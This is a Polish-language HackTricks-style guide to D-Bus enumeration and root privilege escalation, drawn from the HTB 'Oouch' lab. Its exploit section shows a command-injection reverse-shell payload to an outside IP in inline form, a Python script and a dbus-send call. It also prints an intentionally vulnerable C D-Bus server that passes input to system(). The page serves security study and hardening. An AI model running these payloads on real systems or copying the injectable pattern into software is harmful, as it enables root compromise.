# Enumeracja D-Bus i eskalacja uprawnień przez command injection

{{#include ../../banners/hacktricks-training.md}}

## **Enumeracja GUI**

D-Bus jest wykorzystywany jako mediator komunikacji międzyprocesowej (IPC) w środowiskach Ubuntu desktop. W Ubuntu obserwuje się równoczesne działanie kilku message busów: system bus, wykorzystywany głównie przez **uprzywilejowane usługi do udostępniania usług istotnych dla całego systemu**, oraz session bus dla każdego zalogowanego użytkownika, udostępniający usługi istotne wyłącznie dla tego użytkownika. Skupiamy się tutaj przede wszystkim na system bus ze względu na jego powiązanie z usługami działającymi z wyższymi uprawnieniami (np. jako root), ponieważ naszym celem jest eskalacja uprawnień. Warto zauważyć, że architektura D-Bus wykorzystuje „router” dla każdego session bus, odpowiedzialny za przekierowywanie komunikatów klientów do odpowiednich usług na podstawie adresu określonego przez klientów dla usługi, z którą chcą się komunikować.

Usługi w D-Bus są definiowane przez **obiekty** i **interfejsy**, które udostępniają. Obiekty można porównać do instancji klas w standardowych językach OOP, przy czym każda instancja jest jednoznacznie identyfikowana przez **object path**. Ta ścieżka, podobnie jak ścieżka systemu plików, jednoznacznie identyfikuje każdy obiekt udostępniany przez usługę. Kluczowym interfejsem z punktu widzenia badań jest interfejs **org.freedesktop.DBus.Introspectable**, zawierający jedną metodę: Introspect. Metoda ta zwraca reprezentację XML obsługiwanych przez obiekt metod, sygnałów i właściwości; tutaj skupiamy się na metodach, pomijając właściwości i sygnały.

Do komunikacji z interfejsem D-Bus wykorzystano dwa narzędzia: narzędzie CLI o nazwie **gdbus**, służące do łatwego wywoływania metod udostępnianych przez D-Bus w skryptach, oraz [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), oparte na Pythonie narzędzie GUI przeznaczone do enumeracji usług dostępnych na każdym busie i wyświetlania obiektów zawartych w poszczególnych usługach.
```bash
sudo apt-get install d-feet
```
Jeśli sprawdzasz **session bus**, najpierw potwierdź bieżący adres:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na pierwszym obrazie pokazano usługi zarejestrowane w system bus D-Bus, przy czym **org.debin.apt** jest wyróżniona po wybraniu przycisku System Bus. D-Feet odpytuje tę usługę o obiekty, wyświetlając interfejsy, metody, właściwości i sygnały wybranych obiektów, co widać na drugim obrazie. Szczegółowo przedstawiany jest również signature każdej metody.

Istotną funkcją jest wyświetlanie **process ID (pid)** oraz **command line** usługi, co ułatwia potwierdzenie, czy usługa działa z podwyższonymi uprawnieniami, co ma znaczenie dla trafności badań.

**D-Feet umożliwia również wywoływanie metod**: użytkownicy mogą wprowadzać wyrażenia Python jako parametry, które D-Feet konwertuje na typy D-Bus przed przekazaniem ich do usługi.

Należy jednak pamiętać, że **niektóre metody wymagają uwierzytelnienia**, zanim będzie można je wywołać. Zignorujemy te metody, ponieważ naszym celem jest podniesienie uprawnień bez posiadania credentials.

Należy również pamiętać, że niektóre usługi odpytują inną usługę D-Bus o nazwie org.freedeskto.PolicyKit1, aby ustalić, czy użytkownik powinien mieć możliwość wykonania określonych działań.

## **Enumeracja Cmd line**

### Lista obiektów usług

Możliwe jest wyświetlenie otwartych interfejsów D-Bus za pomocą:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Usługi oznaczone jako **`(activatable)`** są szczególnie interesujące, ponieważ **jeszcze nie działają**, ale żądanie do magistrali może uruchomić je na żądanie. Nie poprzestawaj na `busctl list`; powiąż te nazwy z rzeczywistymi plikami binarnymi, które zostałyby uruchomione.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
To szybko wskazuje, która ścieżka `Exec=` zostanie uruchomiona dla aktywowalnej nazwy i z jaką tożsamością. Jeśli plik binarny lub łańcuch jego wykonywania jest słabo zabezpieczony, nieaktywna usługa nadal może stać się ścieżką do privilege escalation.

#### Połączenia

[Z Wikipedii:](https://en.wikipedia.org/wiki/D-Bus) Gdy proces ustanawia połączenie z magistralą, magistrala przypisuje temu połączeniu specjalną nazwę magistrali nazywaną _unikatową nazwą połączenia_. Nazwy magistrali tego typu są niezmienne — gwarantuje się, że nie zmienią się tak długo, jak długo istnieje połączenie — a co ważniejsze, nie mogą zostać ponownie użyte w czasie działania magistrali. Oznacza to, że żadne inne połączenie z tą magistralą nigdy nie otrzyma takiej unikatowej nazwy połączenia, nawet jeśli ten sam proces zamknie połączenie z magistralą i utworzy nowe. Unikatowe nazwy połączeń można łatwo rozpoznać, ponieważ zaczynają się od znaku dwukropka, który w innych przypadkach jest niedozwolony.

### Informacje o obiekcie usługi

Następnie możesz uzyskać informacje o interfejsie za pomocą:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Skoreluj nazwę magistrali z jednostką `systemd` i ścieżką pliku wykonywalnego:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
To odpowiada na kluczowe pytanie operacyjne podczas privesc: **jeśli wywołanie metody zakończy się sukcesem, który rzeczywisty plik binarny i unit wykona działanie?**

### List Interfaces of a Service Object

Musisz mieć wystarczające uprawnienia.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspekcja interfejsu obiektu usługi

Zwróć uwagę, że w tym przykładzie wybrano najnowszy wykryty interfejs za pomocą parametru `tree` (_zobacz poprzednią sekcję_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Zwróć uwagę na metodę `.Block` interfejsu `htb.oouch.Block` (tej, która nas interesuje). Litera „s” w pozostałych kolumnach może oznaczać, że oczekuje ona ciągu znaków.

Przed podjęciem jakichkolwiek niebezpiecznych działań najpierw zweryfikuj metodę **zorientowaną na odczyt** lub inną metodę niskiego ryzyka. Pozwala to jednoznacznie rozróżnić trzy przypadki: nieprawidłową składnię, metodę osiągalną, ale odrzuconą, oraz metodę osiągalną i dozwoloną.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Korelacja metod D-Bus z politykami i akcjami

Introspekcja informuje, **co** można wywołać, ale nie wyjaśnia, **dlaczego** wywołanie jest dozwolone lub odrzucane. W przypadku triage privesc zwykle trzeba przeanalizować wspólnie **trzy warstwy**:

1. **Metadane aktywacji** (pliki `.service` lub `SystemdService=`), aby ustalić, jaki plik binarny i jaka jednostka zostaną faktycznie uruchomione.
2. **Polityka D-Bus w XML** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), aby ustalić, kto może wykonywać `own`, `send_destination` lub `receive_sender`.
3. **Pliki akcji Polkit** (`/usr/share/polkit-1/actions/*.policy`), aby poznać domyślny model autoryzacji (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Przydatne polecenia:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Nie zakładaj mapowania 1:1 między metodą D-Bus a akcją Polkit. Ta sama metoda może wybrać inną akcję w zależności od modyfikowanego obiektu lub kontekstu runtime. Dlatego praktyczny workflow wygląda następująco:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` oraz grep odpowiednich plików `.policy`
3. niskiego ryzyka sondy na żywo za pomocą `busctl call`, `gdbus call` lub `dbusmap --enable-probes --null-agent`

Usługi Proxy lub kompatybilnościowe wymagają szczególnej uwagi. **Proxy działające jako root**, które przekazuje żądania do innej usługi D-Bus przez własne, wcześniej ustanowione połączenie, może przypadkowo sprawić, że backend będzie traktował każde żądanie jako pochodzące od UID 0, jeśli tożsamość pierwotnego wywołującego nie zostanie ponownie zweryfikowana.

### Interfejs monitorowania/przechwytywania

Mając wystarczające uprawnienia (same uprawnienia `send_destination` i `receive_sender` nie wystarczą), możesz **monitorować komunikację D-Bus**.

Aby **monitorować** **komunikację**, musisz być **root**. Jeśli mimo działania jako root nadal napotykasz problemy, sprawdź [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) oraz [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Jeśli wiesz, jak skonfigurować plik konfiguracyjny D-Bus, aby **zezwolić użytkownikom innym niż root na sniffing** komunikacji, **skontaktuj się ze mną**!

Różne sposoby monitorowania:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
W poniższym przykładzie interfejs `htb.oouch.Block` jest monitorowany, a **wiadomość "**_**lalalalal**_**" jest wysyłana w wyniku nieporozumienia**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Możesz użyć `capture` zamiast `monitor`, aby zapisać wyniki w pliku **pcapng**, który można otworzyć w Wiresharku:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrowanie całego szumu <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Jeśli na magistrali jest po prostu zbyt dużo informacji, przekaż regułę dopasowania w następujący sposób:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Można określić wiele reguł. Jeśli wiadomość pasuje do _którejkolwiek_ z reguł, zostanie wyświetlona. Na przykład:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Więcej informacji na temat składni reguł dopasowania znajdziesz w [dokumentacji D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html).

### Więcej

`busctl` ma jeszcze więcej opcji, [**znajdziesz je wszystkie tutaj**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Podatny scenariusz**

Jako użytkownik **qtc wewnątrz hosta „oouch” z HTB** możesz znaleźć **nieoczekiwany plik konfiguracyjny D-Bus** znajdujący się w _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Z poprzedniej konfiguracji wynika, że **musisz być użytkownikiem `root` lub `www-data`, aby wysyłać i odbierać informacje** za pośrednictwem tej komunikacji D-BUS.

Jako użytkownik **qtc** wewnątrz kontenera Docker **aeb4525789d8** możesz znaleźć kod związany z dbus w pliku _/code/oouch/routes.py._ Oto interesujący kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Jak widać, **łączy się z interfejsem D-Bus** i wysyła do funkcji **„Block”** wartość „client_ip”.

Po drugiej stronie połączenia D-Bus działa skompilowany plik binarny w języku C. Ten kod **nasłuchuje** na połączeniu D-Bus **adresu IP i wywołuje iptables za pomocą funkcji `system`**, aby zablokować podany adres IP.\
**Wywołanie `system` jest celowo podatne na command injection**, dlatego payload taki jak poniższy utworzy reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Wykorzystaj to

Na końcu tej strony znajdziesz **kompletny kod C aplikacji D-Bus**. W jego wnętrzu, między liniami 91–97, możesz znaleźć sposób, w jaki **ścieżka obiektu D-Bus** oraz **nazwa interfejsu** są **rejestrowane**. Informacje te będą potrzebne do wysyłania danych do połączenia D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ponadto w linii 57 można znaleźć informację, że **jedyną zarejestrowaną metodą** dla tej komunikacji D-Bus jest `Block`(_**Dlatego w poniższej sekcji payloady będą wysyłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` oraz metody o nazwie `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Poniższy kod w języku Python wyśle payload do połączenia D-Bus, do metody `Block`, za pośrednictwem `block_iface.Block(runme)` (_zauważ, że został wyodrębniony z poprzedniego fragmentu kodu_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl i dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` to narzędzie używane do wysyłania wiadomości do „Message Bus”
- Message Bus – oprogramowanie używane przez systemy do ułatwiania komunikacji między aplikacjami. Jest powiązane z Message Queue (wiadomości są uporządkowane sekwencyjnie), jednak w Message Bus wiadomości są wysyłane w modelu subskrypcji i odbywa się to bardzo szybko.
- Opcja „-system” służy do wskazania, że jest to wiadomość systemowa, a nie wiadomość sesji (domyślnie).
- Opcja „–print-reply” służy do odpowiedniego wyświetlenia naszej wiadomości i odbierania odpowiedzi w formacie czytelnym dla człowieka.
- „–dest=Dbus-Interface-Block” to adres interfejsu Dbus.
- „–string:” – typ wiadomości, którą chcemy wysłać do interfejsu. Istnieje kilka formatów wysyłania wiadomości, takich jak double, bytes, booleans, int i objpath. Spośród nich „object path” jest przydatny, gdy chcemy wysłać ścieżkę pliku do interfejsu Dbus. W tym przypadku możemy użyć pliku specjalnego (FIFO), aby przekazać polecenie do interfejsu w nazwie pliku. „string:;” – służy do ponownego wywołania object path, w którym umieszczamy plik/komendę reverse shell FIFO.

_Należy pamiętać, że w `htb.oouch.Block.Block` pierwsza część (`htb.oouch.Block`) odwołuje się do obiektu usługi, a ostatnia część (`.Block`) odwołuje się do nazwy metody._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automatyczne narzędzia pomocnicze do enumeracji (2023-2025)

Ręczna enumeracja dużej powierzchni ataku D-Bus za pomocą `busctl`/`gdbus` szybko staje się uciążliwa. Dwa niewielkie narzędzia FOSS wydane w ostatnich latach mogą przyspieszyć pracę podczas działań red-team lub na zawodach CTF:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Napisane w C; pojedynczy statyczny binary (<50 kB), który przechodzi przez każdą ścieżkę obiektu, pobiera XML `Introspect` i mapuje go na właścicielski PID/UID.
* Przydatne flagi:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Narzędzie oznacza niezabezpieczone well-known names symbolem `!`, natychmiast ujawniając usługi, które można *own* (przejąć), lub wywołania metod dostępne z powłoki unprivileged.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Skrypt wyłącznie w Pythonie, który wyszukuje *writable* ścieżki w jednostkach systemd oraz nadmiernie liberalne pliki polityk D-Bus (np. `send_destination="*"`).
* Szybkie użycie:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Moduł D-Bus przeszukuje poniższe katalogi i wyróżnia każdą usługę, która może zostać spoofed lub hijacked przez zwykłego użytkownika:
* `/etc/dbus-1/system.d/` oraz `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Istotne błędy eskalacji uprawnień D-Bus (2024-2025)

Śledzenie niedawno opublikowanych CVE pomaga wykrywać podobne niebezpieczne wzorce w custom code. Dwa dobre, niedawne przykłady to:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Usługa działająca jako root udostępniała interfejs D-Bus, który użytkownicy unprivileged mogli rekonfigurować, w tym ładować kontrolowane przez attackera zachowanie makr. | Jeśli daemon udostępnia na system bus **device/profile/config management**, traktuj zapisywalną konfigurację i funkcje makr jako prymitywy code-execution, a nie tylko „ustawienia”. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Działający jako root compatibility proxy przekazywał żądania do backend services bez zachowania security context oryginalnego caller, więc backendy ufały proxy jako UID 0. | Traktuj usługi D-Bus typu **proxy / bridge / compatibility** jako oddzielną klasę błędów: jeśli przekazują uprzywilejowane wywołania, sprawdź, w jaki sposób UID callera / kontekst Polkit dociera do backendu. |

Wzorce, na które należy zwrócić uwagę:
1. Usługa działa **as root on the system bus**.
2. Albo **brakuje authorization check**, albo check jest wykonywany względem **wrong subject**.
3. Dostępna metoda ostatecznie zmienia stan systemu: instalacja pakietów, zmiany użytkowników/grup, konfiguracja bootloadera, aktualizacje profili urządzeń, zapisy do plików lub bezpośrednie wykonywanie poleceń.

Użyj `dbusmap --enable-probes` lub ręcznego `busctl call`, aby potwierdzić, czy metoda jest dostępna, a następnie przeanalizuj policy XML usługi oraz akcje Polkit, aby zrozumieć, **which subject** jest faktycznie autoryzowany.

---

## Szybkie usprawnienia hardeningu i detection

* Wyszukaj polityki world-writable lub otwarte dla *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Wymagaj Polkit dla niebezpiecznych metod – nawet *root* proxies powinny przekazywać PID *callera* do `polkit_authority_check_authorization_sync()`, zamiast własnego.
* Odbieraj uprawnienia w długo działających helperach (użyj `sd_pid_get_owner_uid()`, aby przełączyć namespaces po połączeniu z bus).
* Jeśli nie możesz usunąć usługi, przynajmniej *scope* ją do dedykowanej Unix group i ogranicz dostęp w jej policy XML.
* Blue-team: przechwytuj system bus za pomocą `busctl capture > /var/log/dbus_$(date +%F).pcapng` i zaimportuj go do Wireshark w celu wykrywania anomalii.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
